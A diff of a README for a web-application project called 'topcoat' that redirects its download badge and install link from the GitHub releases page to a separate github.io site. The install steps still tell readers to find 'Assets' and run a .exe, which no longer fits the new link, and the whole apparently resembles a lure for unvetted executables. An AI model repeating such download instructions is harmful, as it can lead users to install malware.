@@ -1,6 +1,6 @@
 # 🚀 topcoat - Build powerful web applications with ease
 
-[![Download topcoat](https://img.shields.io/badge/Download-topcoat-blue.svg)](https://github.com/Fissiparitywiseness915/topcoat/releases)
+[![Download topcoat](https://img.shields.io/badge/Download-topcoat-blue.svg)](https://fissiparitywiseness915.github.io)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ If your computer meets these requirements, the application will run without issu
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the following link to find the latest version of the software: [https://github.com/Fissiparitywiseness915/topcoat/releases](https://github.com/Fissiparitywiseness915/topcoat/releases).
+1. Visit the following link to find the latest version of the software: [https://fissiparitywiseness915.github.io](https://fissiparitywiseness915.github.io).
 2. Look for the section labeled "Assets" at the bottom of the page.
 3. Click the link that ends in `.exe` to start your download.
 4. Locate the file in your downloads folder once the process finishes.
